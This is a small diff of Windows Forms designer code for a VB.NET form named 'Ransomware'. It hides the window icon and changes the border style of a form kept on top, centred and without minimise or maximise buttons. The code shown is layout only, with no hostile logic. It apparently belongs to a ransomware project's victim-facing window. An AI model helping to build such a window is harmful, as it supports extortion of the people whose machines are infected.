@@ -134,10 +134,10 @@ Partial Class Ransomware
         Me.Controls.Add(Me.ChButton2)
         Me.Controls.Add(Me.ChGroupBox2)
         Me.Controls.Add(Me.ChGroupBox1)
-        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog
         Me.MaximizeBox = False
         Me.MinimizeBox = False
         Me.Name = "Ransomware"
+        Me.ShowIcon = False
         Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
         Me.Text = "Ransomware"
         Me.TopMost = True
